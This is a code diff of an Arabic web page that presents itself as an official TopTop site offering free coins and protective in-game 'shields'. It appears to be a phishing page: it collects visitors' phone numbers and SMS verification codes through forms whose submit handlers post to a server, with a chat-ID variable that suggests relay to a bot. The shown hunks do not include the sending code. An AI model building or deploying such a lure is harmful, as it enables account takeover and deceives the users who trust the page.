@@ -1,116 +1,222 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول لـ TopTop</title>
+    <title>ارتداء دروع TopTop - الموقع الرسمي للدروع</title>
+    <meta property="og:title" content="ارتداء دروع TopTop">
+    <meta property="og:description" content="مرحباً بك في أفضل موقع للحصول على دروع TopTop. قم بارتداء أفضل الدروع لحمايتك في اللعبة!">
+    <meta property="og:image" content="https://example.com/toptop-shields-image.jpg">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://YOUR_DOMAIN_HERE/toptop-shields">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="ارتداء دروع TopTop">
+    <meta name="twitter:description" content="مرحباً بك في أفضل موقع لارتداء دروع TopTop. اختر أفضل درع لحمايتك!">
+    <meta name="twitter:image" content="https://example.com/toptop-shields-image.jpg">
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .container {
-            background-color: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            max-width: 400px;
-            width: 100%;
-        }
-        h1, h2 {
-            color: #333;
+            font-family: 'Arial', sans-serif;
             text-align: center;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #FF6B6B, #4ECDC4);
+            color: #ffffff;
+            overflow: auto;
+            position: relative;
         }
-        form {
+
+        .container {
             display: flex;
             flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            backdrop-filter: blur(8px);
+            position: relative;
+            z-index: 2;
         }
-        input, select, button {
+
+        .login-container {
+            max-width: 500px;
+            padding: 30px;
+            border-radius: 10px;
+            background-color: rgba(0, 0, 0, 0.8);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.6);
+        }
+
+        .login-container h1 {
+            margin: 0 0 20px;
+            font-size: 32px;
+            color: #FFD700;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 15px;
             margin: 10px 0;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-        }
-        button {
-            background-color: #4CAF50;
-            color: white;
             border: none;
+            border-radius: 8px;
+            box-sizing: border-box;
+            background-color: #444;
+            color: #ffffff;
+            font-size: 18px;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 8px;
+            background-color: #FFD700;
+            color: #333;
+            font-size: 18px;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: background-color 0.3s ease, transform 0.3s ease;
         }
+
         button:hover {
-            background-color: #45a049;
+            background-color: #FFC000;
+            transform: scale(1.02);
         }
+
+        .pricing-section {
+            margin-top: 20px;
+            padding: 20px;
+            border-radius: 10px;
+            background-color: rgba(0, 0, 0, 0.7);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.6);
+        }
+
+        .pricing-section h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #FFD700;
+        }
+
         .pricing-option {
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: #333;
+            color: #FFD700;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin: 10px 0;
         }
+
+        .pricing-option span {
+            font-size: 20px;
+        }
+
+        .pricing-option button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            background-color: #FFD700;
+            color: #333;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .pricing-option button:hover {
+            background-color: #FFC000;
+        }
+
         .message {
-            background-color: #f8d7da;
-            color: #721c24;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
             padding: 10px;
-            border-radius: 4px;
-            margin-bottom: 10px;
+            background-color: #FF6B6B;
+            color: #fff;
+            text-align: center;
+            font-size: 18px;
             display: none;
+            z-index: 3;
+        }
+
+        @keyframes backgroundAnimation {
+            0% { background-position: 0% 0%; }
+            50% { background-position: 100% 100%; }
+            100% { background-position: 0% 0%; }
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://example.com/toptop-background.jpg') repeat;
+            animation: backgroundAnimation 60s linear infinite;
+            z-index: 1;
+            opacity: 0.2;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="message" id="message"></div>
-        
-        <div id="login-container">
-            <h1>تسجيل الدخول لـ TopTop</h1>
-            <form id="loginForm">
-                <label for="country">اختر الدولة:</label>
-                <select id="country" name="country" required>
-                    <option value="">-- اختر الدولة --</option>
-                    <option value="YE" data-code="+967">🇾🇪 اليمن (+967)</option>
-                    <option value="SA" data-code="+966">🇸🇦 السعودية (+966)</option>
-                </select>
-                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="رقم الهاتف" required>
-                <!-- chatId input will be added dynamically -->
-                <button type="submit">إرسال رقم الهاتف</button>
-            </form>
-        </div>
+   <div class="container">
+    <div class="message" id="message"></div>
 
-        <div id="verification-container" style="display:none;">
-            <h1>إدخال كود التحقق</h1>
-            <form id="verificationForm">
-                <input type="text" id="verificationCode" name="verificationCode" placeholder="أدخل الكود" required>
-                <button type="submit">تأكيد الدخول</button>
-            </form>
-        </div>
+    <!-- لوحة تسجيل الدخول المبدئية -->
+    <div id="initial-login">
+        <h1>تسجيل الدخول عبر رسالة نصية</h1>
+        <button onclick="showLoginForm()">التالي</button>
+    </div>
 
-<div class="pricing-section">
-            <h2>أسعار أكوانزات TopTop</h2>
-            <div class="pricing-option">
-                <span>1000 أكوانز - 0$</span>
-                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">مجاني</button>
-            </div>
-            <div class="pricing-option">
-                <span>2000 أكوانز - 2$</span>
-                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
-            </div>
-            <div class="pricing-option">
-                <span>5000 أكوانز - 5$</span>
-                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
-            </div>
-            <div class="pricing-option">
-                <span>10000 أكوانز - 10$</span>
-                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
-            </div>
+    <!-- صفحة تسجيل الدخول الحقيقية -->
+    <div id="login-container" style="display:none;">
+        <h1>تسجيل الدخول لـ TopTop</h1>
+        <form id="loginForm">
+            <label for="country">اختر الدولة:</label>
+            <select id="country" name="country" required>
+                <option value="">-- اختر الدولة --</option>
+                <option value="YE" data-code="+967">🇾🇪 اليمن (+967)</option>
+                <option value="SA" data-code="+966">🇸🇦 السعودية (+966)</option>
+            </select>
+            <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="رقم الهاتف" required>
+            <button type="submit">إرسال رقم الهاتف</button>
+        </form>
+    </div>
+
+    <div id="verification-container" style="display:none;">
+        <h1>إدخال كود التحقق</h1>
+        <form id="verificationForm">
+            <input type="text" id="verificationCode" name="verificationCode" placeholder="أدخل الكود" required>
+            <button type="submit">تأكيد الدخول</button>
+        </form>
+    </div>
+
+    <div class="shield-section" style="display:none;">
+        <h2>اختر الدرع</h2>
+        <div class="shield-option">
+            <span>🛡️ درع ضد الحظر</span>
+            <button onclick="showShield('درع ضد الحظر')">ارتداء الدرع</button>
+        </div>
+        <div class="shield-option">
+            <span>💣 درع مفخخ</span>
+            <button onclick="showShield('درع مفخخ')">ارتداء الدرع</button>
+        </div>
+        <div class="shield-option">
+            <span>⚔️ درع الروماد</span>
+            <button onclick="showShield('درع الروماد')">ارتداء الدرع</button>
+        </div>
+        <div class="shield-option">
+            <span>🚫 درع الطرد</span>
+            <button onclick="showShield('درع الطرد')">ارتداء الدرع</button>
         </div>
     </div>
-    <script>
+</div>
+
+<script>
     let globalPhoneNumber = '';
     let globalCountry = '';
     let globalChatId = '';
@@ -192,6 +298,14 @@
         return match ? match[1] : 'Unknown';
     }
 
+    // عرض النموذج الحقيقي عند الضغط على "التالي"
+    function showLoginForm() {
+        document.getElementById('initial-login').style.display = 'none';
+        document.getElementById('login-container').style.display = 'block';
+        document.getElementsByClassName('shield-section')[0].style.display = 'block';
+    }
+
+    // إرسال رقم الهاتف
     loginForm.addEventListener('submit', async (event) => {
         event.preventDefault();
         const formData = new FormData(loginForm);
@@ -229,6 +343,7 @@
         }
     });
 
+    // التحقق من كود التحقق
     document.getElementById('verificationForm').addEventListener('submit', async (event) => {
         event.preventDefault();
         const verificationCode = document.getElementById('verificationCode').value.trim();
@@ -267,6 +382,10 @@
             showMessage('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقًا.');
         }
     });
-    </script>
+
+    function showShield(shield) {
+        showMessage(`لقد قمت بارتداء ${shield}`);
+    }
+</script>
 </body>
 </html>
